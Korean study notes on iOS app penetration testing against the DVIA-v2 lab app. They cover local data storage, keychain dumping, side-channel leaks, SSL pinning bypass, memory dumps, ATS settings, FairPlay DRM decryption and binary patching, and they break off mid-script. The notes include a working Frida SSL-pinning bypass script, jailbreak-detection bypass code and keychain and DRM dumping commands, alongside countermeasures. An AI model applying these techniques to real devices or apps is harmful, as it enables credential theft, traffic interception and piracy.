ios
	Obj-C method hook

	2. Tweak(트윅)
		- Cydia 아래의 트윅을 검색해 설치를 진행한다. 검색 버튼을 누르고 트윅명을 입력한다.

		- 트윅 명으로 검색되지 않을 경우 소스 주소를 입력하여 설치한다.

		트윅	설명	소스 주소
		Apple File Conduit "2"	로컬 컴퓨터에서 아이폰 내부 폴더로 접근 할 수 있게 함	http://apt.thebigboss.org/repofiles/cydia/
		Filza File Manager	파일 탐색기	http://apt.thebigboss.org/repofiles/cydia/
		AppSync Unified	서명되지 않은 IPA 패키지를 설치할 수 있게 함	https://cydia.akemi.ai/
		MTerminal	모바일에서 터미널을 사용할 수 있게 함	http://apt.thebigboss.org/repofiles/cydia/
		Darwin CC Tools	Otool 도구를 사용하기 위해 설치	https://apt.binger.com/
		Open SSH	SSH 터미널 접근을 위해 설치	https://apt.binger.com/
		Frida	프리다 서버 설치	http://build.frida.re/
		IPA Installer	장비에서 직접 IPA 패키지를 설치할 수 있게 함	http://apt.thebigboss.org/repofiles/cydia/
		AppStore++ 
	Frida-ios-dump
		- 탈옥된 디바이스에서 복호화된 IPA 추출할 수 있는 도구.
		- 아래의 링크에 접속해 실행파일을 다운로드한다.
		https://github.com/AloneMonkey/frida-ios-dump
	Realm Studio
		- 오픈소스 데이터베이스 관리시스템(DBMS)으로 모바일 환경을 주요 타깃으로 삼은 데이터베이스.
	
	BinaryCookieReader
		- 애플리케이션이 기기에 저장하는 쿠키(Cookie)파일을 분석할 수 있는 프로그램.
		- Python 2.7 에서만 오류없이 정상동작 한다.
		- 아래의 링크에 접속하여 BinaryCookieReader를 다운로드 받고 Python 2.7을 설치한다.
		https://github.com/as0ler/BinaryCookieReader
	
	pasteboard-monitoring.js
		- 애플리케이션 내에서 복사한 데이터는 Pasteboard 버퍼에 저장된다. 해당 프로그램은 Pastebo 버퍼에 저장된 데이터를 출력할 수 있는 스크립트 파일이다.
		- 아래의 링크에 접속하여 pasteboard-monitoring.js 파일을 생성.
		https://github.com/interference-security/frida-scripts/blob/master/iOS/pasteboard-monitoring.js
	
Local Data Storage
	Plist
		애플리케이션 데이터 및 설정 정보를 저장하는데 사용되는 XML 파일
		저장된 정보는 암호화가 되지 않아 중요 정보를 저장하면 안됨
		Info.plist에는 버전 정보, 실행가능한 바이너리 이름, 지원되는 IOS 버전 및 디바이스 모델 등의 정보가 저장(Bundle Container)
		이 외에도 plist 형식을 사용해 앱에서 필요한 데이터를 내부 저장소에 저장(Data Container)
		
		경로
			1. /var/containers/Bundle/Application/$uuid/DVIA-v2.app/Info.plist (Bundle Container)
			2. /private/var/mobile/Containers/Data/Application/$uuid/ (Data Container) (Library/Preferences
		
		Data Container
			Documents	
				전체 경로	/var/mobile/Containers/Data/Applications/$uuid/Documents
				저장 내용	사용자 데이터 저장
				사용자에게 노출되고 생성, 삭제 또는 수정할 수 있는 파일 포함
				사용자가 다운로드한 파일 포함 (비디오 또는 오디오 앱)
			Library/Application support	
				전체 경로	/var/mobile/Containers/Data/Applications/$uuid/
				저장 내용	앱을 실행하는 데 사용되는 폴더로 사용자에게 보이지 않음
				(앱 생성 데이터) 앱이 생성하고 관리하는 데이터, 설정, 탬플릿 등
			Library/Caches	
				전체 경로	/var/mobile/Containers/Data/Applications/$uuid/
				저장 내용	데이터 캐시 파일을 저장하는 곳으로 앱 성능을 위한 목적으로 존재
				디스크 공간 확보를 위해 삭제할 수 있으므로 쉽게 재생성 가능한 파일
			Tmp	
				전체 경로	/var/mobile/Containers/Data/Applications/$uuid/
				저장 내용	임시파일을 위한 저장소로 앱 실행하는 데 필요 없는 파일
		
		
		
	iCloud Container
		/private/var/mobile/Library/Mobile Documents
		iCloud와 관련된 데이터 저장.
	 
	UserDefaults
		 NSUserDefaults 클래스
			사용자 기본 설정 및 속성을 저장하는 가장 일반적인 방법 중 하나
			애플리케이션을 종료하고 재시작해도 정보는 계속 유지
			로그인 상태 저장에 사용될 때도 있음 (계정정보, 접근 토큰 등)
			해당 클래스로 저장한 데이터는 암호화되지 않은 상태로 plist 파일에 저장
			/private/var/mobile/Containers/Data/Application/$uuid/Library/Preferences/com.highaltitudehacks.DVIAswiftv2.plist 파일
			
	
	Keychain
		IOS의 키체인은 모든 앱에서 하나의 키체인만 사용할 수 있음
		kSecAttrAccessGroup 속성의 접근 그룹 기능을 통해 동일한 개발자가 서명한 앱 간 항목에 대한 접근 공유 가능
		키체인에 대한 접근은 securityd 데몬에 의해 관리됨
			앱의 키체인 액세스 그룹, 애플리케이션 식별자 및 애플리케이션 그룹 사용 권한에 따라 관리됨
		/pirvate/var/Keychains/keychain-2db에 키체인 데이터가 저장
		keychain_dumper 도구 사용 (키체인은 암호화된 DB)
			cd /
			unzip Keychain-Dumper-master.zip
			cd /Keychain-Dumper-master
			chmod 755 setup_on_iOS.sh
			sh +x setup_on_iOS.sh
			chmod 755 keychain-dumper
			./keychain_dumper >> dump.txt
		입력한 값이 저장되어 있는 것을 확인 또한 가장 위의 bundle 아이디를 통해서도 검색이 가능
		keychain_dumper 실행 시, 아래와 같이 [HINT] You should unlock your device! 이라고 뜨는 경우에는 결괏값이 제대로 출력되지 않음. 휴대폰 암호 설정 시 입력한 텍스트가 출력됨
		ldid.cpp(3164): _assert(): errno=2 오류 해결 방법(etup_on_iOS.sh 파일 실행 후, keychain_dumper 파일이 삭제된 경우)
			keychain_dumper 파일이 없어 발생하는 오류
			keychain_dumper-1.1.0.zip 파일을 다운로드
			keychain_dumper 파일을 /Keychain-Dumper-master 폴더 안으로 옮긴다
		dyld: Symbol not found: _objc_opt_new 오류 해결
			Keychain-Dumper의 버전이 현재의 기기에 설치된 iOS 버전과 맞지 않아 발생한 오류
			 버전이 낮은 Keychain_Dumper를 다운로
	
	Core Data
		Core Data는 애플리케이션의 모델 객체를 관리(MVC)하기 위한 프레임워크
		Core Data는 SQLite를 영구 저장소로 사용할 수 있지만, 프레임워크 자체는 데이터베이스가 아님
		SQLite와 다른 점은 데이터베이스 테이블명 앞에 Z 문자가 추가
		Core Data에 저장된 데이터는 암호화되지 않아서 중요한 정보를 저장하면 안됨
		중요한 정보를 저장하려면 암호화된 데이터 저장을 할 수 있는 라이브러리를 사용
		/private/var/mobile/Containers/Data/Application/$uuid/Library/Application Support/Model.sqlite
	
	Realm
		Realm 데이터베이스는 IOS 또는 안드로이드에서 사용되는 작은 데이터베이스
		/private/var/mobile/Containers/Data/Application/$uuid/Documents/default.realm
		realm studio or Realm DB 설치 후 default.realm 파일 열기
	
	Webkit Caching
		웹 페이지를 로드하기 위해 UIWebView를 사용하는 애플리케이션은 응답 시간을 단축하기 위해 Caching을 사용
		요청과 응답 데이터가 로컬 저장소에 평문으로 저장되는지 확인
		2020년 12월부터 UIWebView를 사용하는 앱 업데이트를 수락하지 않아 과거의 App에서만 해당 취약점이 발생
		/private/var/mobile/Containers/Data/Application/$uuid/Library/Caches/com.highaltitudehacks.DVIAswiftv2
		위 경로로 이동하여 Cache.db, Cache.db-shm, Cache.db-wal 파일을 선택
	
	
	Couchbase Lite
		Couchbase Lite는 경량화, 임베디드, 문서 기반(NoSQL), 동기화할 수 있는 데이터베이스 엔진
		/private/var/mobile/Containers/Data/Application/$uuid/Library/Application Support/CouchbaseLite/dvcouchbasedb.cblite2
		db.sqlite3, db.sqlite3-wal, db.sqlite3-shm
		
	YapDatabase
		- YapDatabase는 SQLite를 기반으로 구축된 collection/key/value 저장소
		/private/var/mobile/Containers/Data/Application/$uuid/Library/Application Support
		YapDatabase.sqlite, YapDatabase.sqlite-wal, YapDatabase.sqlite-shm
		
		
	
	대응방안
		- 개인정보, 인증정보와 같은 중요 정보는 디바이스 내에 저장하지 않아야함
		- 디바이스에 데이터를 저장해야할 경우 암호화하여 저장
		개인정보의 안정성 확보조치 기준 해설서, KISA, 2020.12.
		


프리다(Frida) 관련 오류 해결방법 정리
	https://hagsig.tistory.com/153


부채널을 통한 데이터 유출 -부채널 데이터 유출(Side Channel Data Leakage)이란 앱의 주기능이 아닌 제삼의(Side) 기능으로  *중요정보가 유출되는 것을 말함
	Device Logs
		앱 사용 시 디바이스에 저장되는 로그를 말하며 앱 개발 시 디버깅 목적을 위해 개발자들이 의도적으로 로그
		3uTools 실행 > Common tools 클릭 > Realtime Log 
			※ 3uTools의 RealTimeScrren 기능을 이용하고 있을 경우 오류가 발생하여 해당 기능이 제대로 동작하지 않음.
		대응 방법
			앱 배포 시 로그 활성화 여부를 확인하고 중요 정보는 디바이스 로그에 기록되지 않도록 조치
	
	App Screenshot
		스크린샷에 중요한 정보가 담길 수 있고, 적절한 보호조치 없이 애플리케이션 샌드박스에 저장되어 쉽게 확인 가능.
			※ .ktx 확장자 파일로 저장
			/private/var/mobile/Containers/Data/Application/$uuid/Library/Caches/Snapshots/com.highaltitudehacks.DVIAswiftv2/
		대응 방법
 			애플리케이션이 백그라운드로 전환될 때 찍는 스크린샷은 애플리케이션의 메인 화면 또는 중요한 데이터가 노출되지 않는 화면을 사용하도록 설정.
	
	Pasteboard
		붙여넣기보드(Pasteboard)란 PC의 클립보드(Clipboard)와 같이 앱 내에서 복사한 데이터를 Pasteboard 버퍼에 저장
		Pasteboard 버퍼에 저장된 데이터를 확인하기 위해선 Frida와 pasteboard-monitoring.js 파일이 필요
		frida -U -l pasteboard-monitoring.js DVIA-v2
		대응 방안
			- 중요 정보를 다루는 곳에서는 Custom Pasteboard 또는 가상 키패드를 사용.
			- 중요 정보가 Pasteboard 버퍼에 저장되지 않도록 중요 정보를 복사할 수 없도록 조치.
			  예시1). 텍스트 복사 기능을 제공하지 않는 컨트롤로 중요 정보를 표시.
			  예시2). 텍스트 필드를 Secure로 설정하여 복사가 안되게 함.
	
	Keystroke logging
		텍스트 필드가 Secure로 설정되지 않은 경우 기본적으로 디바이스의 텍스트 필드에 입력한 모든 입력을 Keystroke 로그에 기록함.
		Keystroke 로그는 /var/mobile/Library/Keyboard/ 위치에 .dat 확장자를 가진 파일로 저장
		private/var/mobile/Library/Keyboard/ 경로로 이동 > dynamic.lm 폴더안에 있는 파일들을 PC로 추출
			※ en-dynamic.lm : 영어로 입력된 텍스트가 저장된 폴더
			※ ko-dynamic.lm : 한글로 입력된 텍스트가 저장된 폴더
		
		대응 방법
 			텍스트 필드를 Secure로 설정하고, autocorrect(자동고침) 옵션을 해제
		예제(샘플) 소스
			//텍스트 필드 secure 설정 샘플 소스
			textField.isSecureTextEntry = true
			//텍스트 필드 autocorrect 해제 샘플 소스
			//Objective-C
			textField.autocorrectionType = UITextAutocorrectionTypeNo;
			//Swift 2
			textField.autocorrectionType = .No
			//Swift 3
			textField.autocorrectionType = .no
			//SwiftUI
			textField.disableAutocorrection(false)
		
	Cookies
		일부 애플리케이션은 Persistance Cookies를 생성해 cookie.binarycookies 파일에 저장
		/private/var/mobile/Containers/Data/Application/$uuid/Library/Cookies
		BinaryCookieReader.py을 이용하여 추출한 cookie.binarycookies 파일을 읽어드린다.
		python BinaryCookieReader.py [파일명]
		메모장을 이용하여 cookie.binarycookies 파일을 읽어도 된다.
		대응 방법
			cookie.binarycookies 파일에 계정정보를 저장하지 말고 서버에서 세션 값을 받아와 인증하도록 설정.
			계정정보를 저장하여 사용해야할 경우 안전한 암호화 알고리즘을 이용하여 데이터를 암호화
		
불필요한 권한
	앱은 접근 권한이 필요한 UsageDescription 키를 Info.plist 파일에 저장하고 있음.
	Info.plist 파일에 저장된 UsageDescription 키에 대한 접근 권한이 필요한 경우, 시스템에서 앱 대신 권한을 요청
	/private/var/mobile/Containers/Data/Application/$uuid/DVIA-v2.app/ Info.plist 
		UsageDescription 키와 설명 문구를 확인
		<key>NSCameraUsageDescription</key>
		<string>~~
	다른 방법으로 디바이스의 설정 앱을 통해 아래와 같이 설치된 앱과 그 앱이 무슨 권한을 필요로 하는지 알 수 있음.
	UsageDescription 키 종류
		블루투스(Bluetooth)
			NSBluetoothAlwaysUsageDescription	앱이 블루투스에 액세스해야 하는 이유를 사용자에게 알려주는 메시지
			NSBluetoothPeripheralUsageDescription 앱이 Bluetooth 주변 장치에 연결하는 기능을 요청하는 이유를 사용자에게 알려주는 메시지
		일정 및 미리 알림(Calendar and reminders)
			NSCalendarsUsageDescription	앱이 사용자의 일정 데이터에 대한 액세스를 요청하는 이유를 사용자에게 알려 주는 메시지
			NSRemindersUsageDescription	앱이 사용자의 미리 알림에 대한 액세스를 요청하는 이유를 사용자에게 알려주는 메시지
		카메라 및 마이크(Camera and microphone)	
			NSCameraUsageDescription	앱이 장치의 카메라에 대한 액세스를 요청하는 이유를 사용자에게 알려 주는 메시지
			NSMicrophoneUsageDescription	앱이 장치의 마이크에 대한 액세스를 요청하는 이유를 사용자에게 알려 주는 메시지
		...
		...
		https://hagsig.tistory.com/161	
	대응방안
		- 주어진 권한이 앱에서 반드시 필요한 것인지 확인 후, 불필요하거나 과도한 권한일 경우 삭제.
		- 해당 권한을 왜 사용하여야 하는지 문구를 상세히 작성.
		※ UsageDescription 키에 대한 자세한 내용은 아래의 사이트에서 확인 할 수 있음.
			https://developer.apple.com/documentation/bundleresources/information_property_list/protected_resources

		
SSL 인증서 고정(SSL Certificate Pinning) 
	 SSL 인증서가 변조될 경우 프록시 툴(BurpSuite, Fiddler 등)에 의해 패킷이 분석 및 변조되며, 이를 이용하여 해커가 공격을 시도할 수 있다. 
	하여 어플(앱)에서는 SSL 인증서가 변조될 경우 더 이상 어플이 동작하지 않도록 보안조치를 취하는데 이를 SSL 인증서 고정
	
	ios 12 이하 버전
		frida -U -l "인증서우회파일이름" "[앱 이름]"
			var SSL_VERIFY_NONE = 0;
			var ssl_ctx_set_custom_verify;
			var ssl_get_psk_identity;

			/* Create SSL_CTX_set_custom_verify NativeFunction 
			 *  Function signature https://github.com/google/boringssl/blob/7540cc2ec0a5c29306ed852483f833c61eddf133/include/openssl/ssl.h#L2294
			 */
			ssl_ctx_set_custom_verify = new NativeFunction(
				Module.findExportByName("libboringssl.dylib", "SSL_CTX_set_custom_verify"),
				'void', ['pointer', 'int', 'pointer']
			);

			/* Create SSL_get_psk_identity NativeFunction 
			 * Function signature https://commondatastorage.googleapis.com/chromium-boringssl-docs/ssl.h.html#SSL_get_psk_identity
			 */
			ssl_get_psk_identity = new NativeFunction(
				Module.findExportByName("libboringssl.dylib", "SSL_get_psk_identity"),
				'pointer', ['pointer']
			);

			/** Custom callback passed to SSL_CTX_set_custom_verify */
			function custom_verify_callback_that_does_not_validate(ssl, out_alert) {
				return SSL_VERIFY_NONE;
			}

			/** Wrap callback in NativeCallback for frida */
			var ssl_verify_result_t = new NativeCallback(function(ssl, out_alert) {
				custom_verify_callback_that_does_not_validate(ssl, out_alert);
			}, 'int', ['pointer', 'pointer']);

			/* Do the actual bypass */
			function bypassSSL() {
				console.log("[+] Bypass successfully loaded ");

				Interceptor.replace(ssl_ctx_set_custom_verify, new NativeCallback(function(ssl, mode, callback) {
					//  |callback| performs the certificate verification. Replace this with our custom callback
					ssl_ctx_set_custom_verify(ssl, mode, ssl_verify_result_t);
				}, 'void', ['pointer', 'int', 'pointer']));

				Interceptor.replace(ssl_get_psk_identity, new NativeCallback(function(ssl) {
					return "notarealPSKidentity";
				}, 'pointer', ['pointer']));

			}
			bypassSSL();
	
	ios 10.3.3, 13.5 에서 일반->정보->인증서 신뢰 설정에서 DO_NOT_TRUST_FiddlerRoot를 활성화 하면 frida를 사용하지 않고 SSL pinning bypass가 가능
		frida --codeshare federicodotta/ios13-pinning-bypass -U [앱이름]
		iOS 버전 12까지는 SSL Pinning 적용 후 Burp Suite 사용하는데 크게 문제가 없음
		iOS 버전 13 이상부터 Burp 로 안잡히는 현상 발생 
		해당 이슈는 Burp Suite 최신 버전 설치 후 Option -> Edit -> TLS Protocols -> TLS v1.2 
		체크 후 사용하면 정상적으로 패킷이 잡아지는 것을 확인함
		ssl kill switch2
	
	프록시
		설정 앱 실행 > Wi-Fi 클릭 > 현재 연결된 네트워크 클릭 > 프록시 구성 클릭 > 수동 선택 > 서버와 포트 번호 입력 > 저장 
		BurpSuite 실행 > Proxy 클릭> Proxy settings 클릭 > Proxy listeners의 Edit 클릭 > All interface 선택 > OK 클
		인터넷 브라우저 앱 실행 > http://burp 입력 및 접속 > 우측 상단의 "CA Certificate" 클릭 > 허용 클릭 > 닫기 >설정 앱 실행 > 일반 > 프로파일 > PortSwigger CA 클릭 >설치 클릭 > 디바이스 암호 입력 > 설치 클릭>우측 상단의 완료 클릭
		설정 앱 실행 > 일반 클릭 > 정보 클릭 > 인증서 신뢰 설정 클릭 > PortSwigger CA 활성화 > 계속 클릭
		


중요정보 메모리 저장(Important Information in Memory) 취약점
	일부 애플리케이션은 중요정보(ID, PW, 개인정보 등)를 메모리에 저장한다. 보통 평문으로 저장되기 때문에 메모리 덤프 도구를 이용할 경우 해당 정보가 유출
	 frida-ps -Ua
	 python fridump3.py -u -r -s "[앱이름(Name)]"
	 
	대응 방안
		- 개발자가 중요한 정보를 포함할 수 있는 속성 또는 인스턴스 변수를 사용 후 제거하지 않아 발생하는 취약점으로, 배포 전 해당 기능을 꼭 제거하여 메모리 내에 중요정보가 남지 않도록 한다.
		※ 꼭 사용해야 할 경우, 중요정보를 담고 있는 변수의 메모리를 사용직후 바로 해제하거나 다른 값으로 덮어씌워 메모리에 중요정보가 남지 않도록 한다.
		- 중요 정보를 입력하는 곳에는 가상 키보드 사용(종단 간 암호화로 인해 메모리에 계정정보가 평문으로 남지 않음).


ATS(App Transport Security)
	- 애플리케이션과 웹 서비스 사이의 통신 시 보안 향상을 위한 기능으로 iOS 9.0부터 적용 가능하다.
	- 모든 인터넷 통신 시 안전한 프로토콜을 사용하도록 보장하는 것으로, *스니핑과 같은 공격으로 부터 중요정보가 유출되는 것을 방지한다.
	- 즉, HTTP 통신을 허용하지 않거나, 버전이 낮은 취약한 TLS를 사용하여 HTTPS 통신을 하지 못하게 하는 등의 역할
	/var/containers/Bundle/Application/$uuid/DVIA-v2.app
	 info.plist 파일을 더블클릭한 다음 NSAppTransportSecurity 키가 있는 위치로 이동  NSAppTransportSecurity : HTTP 연결의 보안 설정에 대한 내용을 볼 수 있는 키
		NSAllowsArbitraryLoads 키를 사용 중인 것으로 확인 -NSAllowsArbitraryLoads : HTTP 통신을 허용하는 키
	
	- ATS는 3개의 딕셔너리(Dictionary)와 9개의 하위 키(Key)로 이루어져있다.
	키를 사용할 경우 App Store 심사 시, 왜 사용하여야 하는지 근거자료를 제출
		NSAppTransportSecurity : Dictionary {
			NSAllowsArbitraryLoads : Boolean
			NSAllowsArbitraryLoadsForMedia : Boolean
			NSAllowsArbitraryLoadsInWebContent : Boolean
			NSAllowsLocalNetworking : Boolean
			NSExceptionDomains : Dictionary {
				<domain-name-string> : Dictionary {
					NSIncludesSubdomains : Boolean
					NSExceptionAllowsInsecureHTTPLoads : Boolean
					NSExceptionMinimumTLSVersion : String
					NSExceptionRequiresForwardSecrecy : Boolean   // Default value is YES
					NSRequiresCertificateTransparency : Boolean
				}
			}
		}
	Dictionary
		NSAppTransportSecurity	앱의 전반적인 네트워크 연결에 대한 ATS 보호를 구성하거나, 명명된 도메인에 대한 사용자 지정 구성을 할 수 있다.
		NSExceptionDomains	도메인 별로 ATS를 구성할 수 있으며, NSAppTransportSecurity Dictionary에서 설정한 전역 설정값과 관계없이 모든 ATS 보호를 받게 된다.
		<domain-name-string> 연결 구성을 지정하려는 도메인을 식별하는 곳으로, NSExceptionDomains Dictionary에 도메인 이름을 원하는 만큼 지정할 수 있다. 하위키 중 하나 이상을 포함하도록 각 Dictionary을 구성하여야 한다.
	
	NSAppTransportSecurity 딕셔너리의 하위 키
		Key	설명
		NSAllowsArbitraryLoads	YES로 설정할 경우, NSExceptionDomains을 통해 개별적으로 구성하는 도메인에 대한 연결을 제외하고 모든 네트워크 연결에 대한 ATS 제한이 비활성화된다. (기본값 NO)
		NSAllowsArbitraryLoadsForMedia	YES로 설정할 경우, AV Foundation 프레임워크를 사용하여 앱이 로드하는 미디어에 대한 모든 ATS 제한이 비활성화됩니다. (기본값 NO)
		NSAllowsArbitraryLoadsInWebContent	YES로 설정할 경우, 웹 보기에서 이루어진 요청에 대한 모든 ATS 제한이 비활성화된다. (기본값 NO)
		NSAllowsLocalNetworking	YES로 설정할 경우, 앱의 나머지 부분에 대해 ATS를 비활성화하지 않고도 로컬 리소스를 로드할 수 있음. (기본값 NO)
	
	<domain-name-string> 딕셔너리의 하위 키
		Key	내용
		NSIncludesSubdomains	YES로 설정할 경우, 명명된 도메인의 ATS 구성을 모든 하위 도메인에 적용한다. (기본값 NO)
		NSExceptionAllowsInsecureHTTPLoads	YES로 설정할 경우, 명명된 도메인에 대해 안전하지 않은 HTTP 로드를 허용하지만 TLS(Transport Layer Security) 요구 사항을 변경하지 않으며 명명된 도메인에 대한 HTTPS 로드에 영향을 주지 않음. (기본값 NO)
		NSExceptionMinimumTLSVersion	명명된 도메인의 네트워크 연결을 위한 최소 TLS 버전을 지정하여 덜 안전한 이전 버전의 Transport Layer Security를 ​​사용한 연결을 허용한다.
		NSExceptionRequiresForwardSecrecy	NO로 설정할 경우, 명명된 도메인에 대해 PFS(Perfect Forward Secrecy)를 지원하지 않는 TLS 암호화를 허용한다. (기본값 YES)
		NSRequiresCertificateTransparency	YES로 설정할 경우, 명명된 도메인에 대한 서버 인증서에 대해 유효하고 서명된 투명한 인증서의 타임스탬프가 필요하다. (기본값 NO
	
	잘못된 보안설정으로 인한 ATS 취약점
		- ATS를 잘못 설정할 경우 HTTP 통신이 허용되어 중요 정보가 평문으로 통신될 수 있음.
		- 낮은 TLS 버전을 사용하도록 설정되어 취약점을 이용한 공격이 이루어질 수 있음.
		예시) 아래와 같이 설정되어 있을경우 HTTP를 허용하는 방식이므로 매우 위험하다.
			<key>NSAppTransportSecurity</key>
			<dict>
				<key>NSAllowsArbitraryLoads</key>
				<true/> //모든 네트워크 연결에 대한 ATS 제한이 비활성화
			</dict>
	 대응 방법
		- HTTP 프로토콜로 전송되는 모든 데이터를 암호화하거나 HTTPS를 사용하여 암호화 통신을 한다.
		- HTTPS를 사용하도록 설정해도 애플리케이션의 설정이 잘못되어 있을 경우, 예기치 못한 HTTP 통신으로 인해 중요 데이터가 유출될 수 있으므로 아래의 두 가지 방법을 통해 HTTP 통신을 사전에 차단하여야 한다.
		<key>NSAppTransportSecurity</key>
		<dict>
			<key>NSTemporaryExceptionAllowsInsecureHTTPLoads</key> //HTTP 통신을 허용하지 않음.
			<true/>
		</dict>	
		
		<key>NSAppTransportSecurity</key>
		<dict>
			<key>NSExceptionDomains</key> //특정 도메인만 HTTP 통신을 허용.
			<dict>
				<key>example.com</key>
				<dict>
					<key>NSTemporaryExceptionAllowsInsecureHTTPLoads</key>
					<true/>
				</dict>
			</dict>
		</dict>
		
		
페어플레이(Fairplay) DRM 
	- 앱(어플)의 바이너리 파일을 암호화하여 분석 및 변조가 어렵도록 하는 것.
	- 앱 스토어(App Store)에서 다운로드한 앱은 모두 페이플레이 DRM으로 암호화되어 있음.
	- 페어플레이 DRM 적용여부는 Otool 도구를 이용하여 확인 가능.
	- 페어플레이 DRM이 복호화될 경우 작동방식 및 내부 클래스 구조등을 쉽게 파악하게 되어 보안기능을 우회
	
	적용여부 확인
		3uTools 실행 > Toolbox 클릭 > Open SSH Tunnel 클릭
		※ 기본(Default) ID : root / PW : alpine
		> otool -l "바이너리파일 경로" | grep "cryptid"
			※ Cryptid 값이 1일 경우 페어플레이 DRM이 적용되어 있는 것이고, 0일 경우 페어플레이 DRM이 적용되어 있지 않은 것.
		※ 바이너리 파일 경로
			/var/Containers/Bundle/Application
			
	페어플레이 DRM 복호화 방법
	1. CRACKERXI+
		ydia 앱 실행 > 소스 클릭 > 편집 클릭 > 추가 클릭 > cydia.iphonecake.com 입력 > 소스추가 클릭 > Cydia로 복귀 클릭 > 개별 소스 목록에 AppCake가 보인다면 제대로 설치
		검색 클릭 > CrackerXI+ 검색 > CrackerXI+ 클릭 > 설치 클릭 > 확인 클릭
		SpringBoard 다시 시작 클릭 > 홈 화면에 추가된 CrackerXI+ 앱 실행 > Settings 클릭 > 모든 옵션 활성화
		AppList 클릭 > 새로고침 클릭 > 복호화하고 싶은 앱 클릭 > YES, Full IPA 클릭 > Dismiss 클릭
		/private/var/mobile/Documents/CrackerXI 경로에 복호화한 앱의 IPA파일이 존재
		
	2. Clutch
		ssh연결 ※ 기본(Default) ID : root / PW : alpine
		cd /usr/bin
		wget https://github.com/KJCracks/Clutch/releases/download/2.0.4/Clutch-2.0.4
		chmod 755 ./Clutch-2.0.4
		./Clutch-2.0.4 -i
		./Clutch-2.0.4 [옵션] [앱 번호]
			./Clutch-2.0.4 -b 2
			# 옵션 : b (바이너리 파일 추출)
			# 옵션 : d (IPA 파일 추출)
		 /private/var/tmp/clutch 경로에 저장
		
	3. Frida-iOS-Dump.py
		디바이스와 PC의 연결을 위해 아래의 iTunesDriver64 관련 파일을 모두 다운로드한 뒤, 압축을 해제하여 프로그램을 설치
		itunnel_mux_rev71 설치
		itunnel_mux.exe --iport 22 --lport 2222 (pc연결)
		Frida-iOS-Dump 도구를 다운로드
		pip install -r requirements.txt --upgrade
		frida-ios-dump의 dump.py 파일은 리눅스 환경에서 동작하도록 코딩되어 있다. 윈도우 환경에서 실행시키려면 다음과 같이 소스를 수정
			#25 line Add
			import stat

			#89 line Modify
			#zip_args = ('zip', '-qr', os.path.join(os.getcwd(), ipa_filename), target_dir)
			zip_args = (os.getcwd() + '\\7z.exe', 'a', '-r', os.path.join(os.getcwd(), ipa_filename), target_dir)

			#123 ~ 127 line Modify
			#chmod_args = ('chmod', '655', chmod_dir)
			#try:
				#subprocess.check_call(chmod_args)
			#except subprocess.CalledProcessError as err:
				#print(err)
			if not os.access(chmod_dir, os.W_OK):
				os.chmod(chmod_dir, stat.S_IWUSR)
				
			#141 ~ 145 line Modify
			#chmod_args = ('chmod', '755', chmod_dir)
			#try:
				#subprocess.check_call(chmod_args)
			#except subprocess.CalledProcessError as err:
				#print(err)
			if not os.access(chmod_dir, os.W_OK):
				os.chmod(chmod_dir, stat.S_IWUSR)
					 
		7z.exe, 7z.dll 파일을 dump.py가 있는 폴더로 옮긴다.
		frida-ps -Ua (현재 실행 중인 앱의 정보를 표시하는 명령어)
		Identidier값을 확인하였다면 아래의 명령어를 입력하여 페어플레이 DRM 복호화를 실행
			python dump.py "앱의 Identidier값"
			unexpectedly timed out while waiting for app to launch이라는 문구가 뜬다면 디바이스에 복호화할 앱이 실행되었을 것이다. 그 상태로 다시 한번 명령어를 입력하면 복호화가 정상적으로 실행
		SSH 접속 오류가 발생한다면 디바이스 설정에 맞게 password와 port 번호를 바꾸어 주면 된다.
		Port를 22로 바꾸면 되는 경우도 있다.(alpine, 2222 변조)
		아래와 같이 [앱이름].ipa 파일이 생성되었다면 페어플레이 DRM 복호화가 제대로 된 것
		
		리눅스 환경
			apt install libusbmuxd-tools
			iproxy 2222 22
			Frida-iOS-Dump 도구를 다운로드
			frida-ps -Ua (현재 실행 중인 앱의 정보를 표시하는 명령어)
			python dump.py "앱의 Identidier값"



애플리케이션 패칭
	애플리케이션 패칭(Application Patching)은 애플리케이션의 바이너리 파일이 영구적으로 변경되는 것을 말하며 애플리케이션 위·변조
	바이너리 파일에는 앱 실행 및 동작에 필요한 모든 데이터들이 들어가 있으므로 바이너리 파일을 수정하여 로그인 메소드, 탈옥 탐지 메소드 등을 우회
	예시1
		기드라 내 문자열 검색 -> 음영표시된 칸의 우측 "__T07DVIA_v240ApplicationPathin..."을 더블클릭 -> 더블클릭 시 음영표시된 칸을 선택 → Window 클릭 → Function Graph 클릭
		음영표시된 칸을 우클릭 → Patch Instruction 클릭
		오프셋을 성공로직이 있는 오프셋(1001ac1bc)으로 변경한 뒤 엔터를 누른다.
			* 기존(AS-IS) : 0x1001ac270
			* 변경(TO-BE) : 0x1001ac1bc
		File 클릭 → Export Program 클릭 -> Format을 Binary로 변경 → OK 버튼 클릭
	예시2
		ASLR 적용여부 확인
		- 바이너리 파일을 분석하기 위해서는 ASLR이 적용되어 있지는 확인
		otool -Vh [바이너리 파일 이름]( 앱 폴더로 이동하여 (/var/Containers/Bundle/Application)
		PIE 적용시 ASLR 적용된것(PIE란 Position Independent Execution의 약자로 메모리 어디에 매핑되어도 실행에 지장이 없도록 바이너리를 위치를 독립적으로 컴파일하는 기법을 말하며, 바이너리가 실행될 때마다 랜덤한 주소에 매핑시켜 주는 메모리 보호기법 중 하나)
		음영표시된 칸의 우측 "XREF[1]:     __T07DVIA_v213DVIAUtilitiesC9sho..."을 더블클릭
		더블클릭 시 음영표시된 칸을 선택 → Window 클릭 → Function Graph 클릭
		w0의 값이 0x0일 때와 아닐 때의 결과가 달라진
		#0x0을 'Check For Jailbreak' 클릭 시 w0에 입력되는 값으로 수정하여 탈옥탐지 기능을 우회
		frida -U -l hagsig_patching.js DVIA-v2
			 //DVIA-v2 바이너리가 실행되어 메모리에 올라갔을때 할당된 주소를 realbase_address에 저장
			var realbase_address = Module.findBaseAddress('DVIA-v2')
			//realbase_address에 저장된 주소를 화면에 출력
			console.log('realbase address : ' + realbase_address)

			//realbase_address에 위에서 확인한 분기점의 오프셋을 더함
			//분기점 메모리 주소가 jailbreak_address에 저장됨
			var jailbreak_address = realbase_address.add('0x1cbdd0') // 1001cbdd0 에서 1cbdd0 부분 추출
			//jailbreak_address에 저장된 주소를 화면에 출력
			console.log('jailbreak address : ' + jailbreak_address)

			//jailbreak_address에서 호출되는 값을 가로채기 위해 준비
			Interceptor.attach(jailbreak_address, {
				//호출되는 레지스터 값을 받아옴
				onEnter: function(args){
					//받아온 레지스터 값을 JSON 형태로 화면에 출력
				console.log(JSON.stringify(this.context))
			
